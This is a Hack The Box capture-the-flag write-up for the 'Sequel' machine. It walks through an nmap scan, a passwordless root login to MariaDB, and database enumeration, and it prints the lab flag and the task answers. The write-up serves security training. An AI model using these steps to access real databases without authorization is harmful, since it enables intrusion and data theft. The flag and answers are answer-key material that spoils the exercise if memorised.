# Hack The Box — Sequel

## Machine Information

| Category   | Details          |
| ---------- | ---------------- |
| Machine    | Sequel           |
| Platform   | Hack The Box     |
| Difficulty | Very Easy        |
| Category   | Starting Point   |
| Target IP  | `10.129.231.178` |
| Service    | MySQL / MariaDB  |
| Port       | `3306`           |

---

## 1. Reconnaissance

The first step was to identify the open ports and services running on the target machine.

### Nmap Service Scan

```bash
sudo nmap -sV 10.129.231.178
```

Output:

```text
3306/tcp open mysql?
```

The scan identified port `3306`, which is commonly associated with MySQL/MariaDB.

I then performed a default script scan:

```bash
sudo nmap -sC 10.129.231.178
```

Relevant output:

```text
3306/tcp open  mysql
| mysql-info:
|   Protocol: 10
|   Version: 5.5.5-10.3.27-MariaDB-0+deb10u1
|   Thread ID: ...
|   Capabilities flags: ...
|   Status: ...
|   Salt: ...
|   Auth Plugin Name: mysql_native_password
```

### Findings

* **Port:** `3306`
* **Service:** MySQL
* **Database:** MariaDB
* **Version:** `10.3.27`

---

## 2. MariaDB Enumeration

The next step was to connect to the database service.

The MySQL/MariaDB command-line client was used:

```bash
mysql -h 10.129.231.178 -u root -p
```

Initially, the connection produced a TLS/SSL error.

I then tried:

```bash
mysql -h 10.129.231.178 -u root --skip-ssl
```

This successfully connected without requiring a password.

This demonstrated that the `root` account allowed passwordless authentication from the HTB VPN connection.

### Login Details

```text
Host: 10.129.231.178
Username: root
Password: Not required
```

---

## 3. Database Enumeration

After connecting to MariaDB, I enumerated the available databases.

```sql
SHOW DATABASES;
```

Output:

```text
+--------------------+
| Database           |
+--------------------+
| htb                |
| information_schema |
| mysql              |
| performance_schema |
+--------------------+
```

The database unique to the target was:

```text
htb
```

---

## 4. Selecting the Database

To work with the `htb` database, I used:

```sql
USE htb;
```

Then I enumerated the tables:

```sql
SHOW TABLES;
```

The database contained two tables:

```text
config
users
```

---

## 5. Enumerating the Tables

I first examined the structure of the `config` table:

```sql
DESCRIBE config;
```

The table contained:

```text
+-------+---------------------+------+-----+---------+----------------+
| Field | Type                | Null | Key | Default | Extra          |
+-------+---------------------+------+-----+---------+----------------+
| id    | bigint(20) unsigned | NO   | PRI | NULL    | auto_increment |
| name  | text                | YES  |     | NULL    |                |
| value | text                | YES  |     | NULL    |                |
+-------+---------------------+------+-----+---------+----------------+
```

The important columns were:

* `id`
* `name`
* `value`

I then queried the table:

```sql
SELECT * FROM config;
```

Output:

```text
+----+-----------------------+----------------------------------+
| id | name                  | value                            |
+----+-----------------------+----------------------------------+
|  1 | timeout               | 60s                              |
|  2 | security              | default                          |
|  3 | auto_logon            | false                            |
|  4 | max_size              | 2M                               |
|  5 | flag                  | 7b4bec00d1a39e3dd4e021ec3d915da8 |
|  6 | enable_uploads        | false                            |
|  7 | authentication_method | radius                           |
+----+-----------------------+----------------------------------+
```

The `name` column contained an entry called:

```text
flag
```

Therefore, the table containing the flag entry was:

```text
config
```

---

## 6. Flag

The value associated with the `flag` entry was:

```text
7b4bec00d1a39e3dd4e021ec3d915da8
```

This was the flag stored in the database.

---

## 7. Task Answers

| Task                             | Answer                             |
| -------------------------------- | ---------------------------------- |
| MySQL port                       | `3306`                             |
| Database version                 | `MariaDB 10.3.27`                  |
| MySQL username switch            | `-u`                               |
| Passwordless username            | `root`                             |
| SQL symbol to display everything | `*`                                |
| SQL query terminator             | `;`                                |
| Unique database                  | `htb`                              |
| Select database command          | `USE`                              |
| Table containing `flag` entry    | `config`                           |
| Database flag                    | `7b4bec00d1a39e3dd4e021ec3d915da8` |

---

## 8. Commands Used

### Nmap

```bash
sudo nmap -sV 10.129.231.178
```

```bash
sudo nmap -sC 10.129.231.178
```

### MariaDB Connection

```bash
mysql -h 10.129.231.178 -u root --skip-ssl
```

### Database Enumeration

```sql
SHOW DATABASES;
```

```sql
USE htb;
```

```sql
SHOW TABLES;
```

### Table Enumeration

```sql
DESCRIBE config;
```

```sql
SELECT * FROM config;
```

---

## 9. Methodology Summary

The machine followed a straightforward database enumeration path:

```text
Nmap
  ↓
Port 3306
  ↓
MariaDB 10.3.27
  ↓
Passwordless root login
  ↓
SHOW DATABASES
  ↓
htb database
  ↓
SHOW TABLES
  ↓
config / users
  ↓
SELECT * FROM config
  ↓
flag entry
  ↓
Flag
```

---

## Conclusion

The Sequel machine demonstrated the importance of properly enumerating exposed database services.

The main weaknesses were the externally accessible MariaDB service and the ability to authenticate as `root` without a password. Once authenticated, database enumeration revealed the `htb` database, which contained a `config` table holding the flag.

**Key lesson:** Always enumerate exposed database services carefully, including authentication behavior, available databases, tables, columns, and stored data.

---

> **Target:** `10.129.231.178`
> **Service:** MariaDB
> **Port:** `3306`
> **Database:** `htb`
> **Flag:** `7b4bec00d1a39e3dd4e021ec3d915da8`
